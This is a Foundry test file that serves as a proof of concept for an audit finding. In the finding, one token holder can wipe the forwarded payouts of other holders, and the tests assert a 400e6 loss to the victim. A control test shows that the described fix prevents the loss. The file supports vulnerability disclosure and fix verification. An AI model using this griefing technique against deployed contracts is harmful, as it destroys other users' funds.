// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {Exploit, MiniToken} from "./61174-a-single-holder-can-grief-the-payouts-of-all-holders-forwa.sol";

contract PoC_61174 is Test {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;

    function test_exploit_griefWipesForwardedPayouts() public {
        Exploit e = new Exploit();
        e.run();

        // Total calculatedPayout wiped from the shared forwarder = 5 * 100e6.
        assertEq(e.totalWiped(), 500e6, "forwarder calculatedPayout not wiped");

        // Grief harm: the still-forwarding victim (user1) loses 400e6, which is
        // 4x the 100e6 the removing holder (user2) sacrifices himself.
        assertEq(e.victimLoss(), 400e6, "victim forwarded payout not lost");

        // Marker records the lost forwarded payout at the SINK.
        MiniToken marker = MiniToken(e.markerToken());
        assertEq(marker.balanceOf(SINK), 400e6, "marker harm not recorded at SINK");
    }

    function test_control_fixedPreservesForwardedPayouts() public {
        Exploit e = new Exploit();
        e.runFixed();

        // With the fix (also require calculatedPayout == 0 before deleteUser),
        // removing the forwarder does NOT wipe the accumulator: no victim loss.
        assertEq(e.victimLossFixed(), 0, "fixed variant still griefs payouts");
    }
}
